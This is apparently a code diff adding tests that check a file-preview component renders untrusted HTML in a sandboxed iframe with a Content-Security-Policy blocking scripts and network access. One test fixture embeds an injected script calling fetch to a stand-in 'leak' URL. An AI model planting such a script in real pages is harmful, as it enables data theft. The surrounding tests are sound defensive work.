@@ -7,6 +7,7 @@ import { FilePreviewInspector, PreviewError } from "./FilePreviewInspector";
 // The markdown tests below carry inline `content`, so they never hit
 // readArtifact — this mock only feeds the binary-file test.
 const probeLargeFile = vi.fn();
+const previewUrl = vi.fn(async () => null as string | null);
 vi.mock("@/lib/artifactFile", async (importOriginal) => {
   const mod = await importOriginal<typeof import("@/lib/artifactFile")>();
   return {
@@ -19,6 +20,7 @@ vi.mock("@/lib/artifactFile", async (importOriginal) => {
       size: 3,
     })),
     probeLargeFile: (...args: unknown[]) => probeLargeFile(...args),
+    previewUrl: () => previewUrl(),
   };
 });
 
@@ -56,6 +58,43 @@ describe("FilePreviewInspector — markdown", () => {
     rerender(<FilePreviewInspector data={b} onClose={() => {}} />);
     expect(await screen.findByRole("heading", { name: "Beta" })).toBeInTheDocument();
     expect(screen.queryByRole("heading", { name: "Alpha" })).not.toBeInTheDocument();
+  });
+});
+
+describe("FilePreviewInspector — HTML security", () => {
+  it("renders inline HTML without script permission or external network access", async () => {
+    const html: FilePreviewInspectorT = {
+      variant: "file",
+      path: "reports/untrusted.html",
+      filename: "untrusted.html",
+      artifact: "report",
+      content: '<h1>Report</h1><script>fetch("https://example.com/leak")</script>',
+    };
+
+    render(<FilePreviewInspector data={html} onClose={() => {}} />);
+
+    const frame = await screen.findByTitle(/HTML preview/i);
+    expect(frame).toHaveAttribute("sandbox", "");
+    expect(frame.getAttribute("srcdoc")).toContain('http-equiv="Content-Security-Policy"');
+    expect(frame.getAttribute("srcdoc")).toContain("script-src 'none'");
+    expect(frame.getAttribute("srcdoc")).toContain("connect-src 'none'");
+  });
+
+  it("does not grant script permission to HTML served by the local preview server", async () => {
+    previewUrl.mockResolvedValueOnce("http://127.0.0.1:49152/token/w/report.html");
+    const html: FilePreviewInspectorT = {
+      variant: "file",
+      path: "reports/report.html",
+      filename: "report.html",
+      artifact: "report",
+      content: "<h1>Report</h1>",
+    };
+
+    render(<FilePreviewInspector data={html} onClose={() => {}} />);
+
+    const frame = await screen.findByTitle(/HTML preview/i);
+    expect(frame).toHaveAttribute("src", "http://127.0.0.1:49152/token/w/report.html");
+    expect(frame).toHaveAttribute("sandbox", "");
   });
 });
 
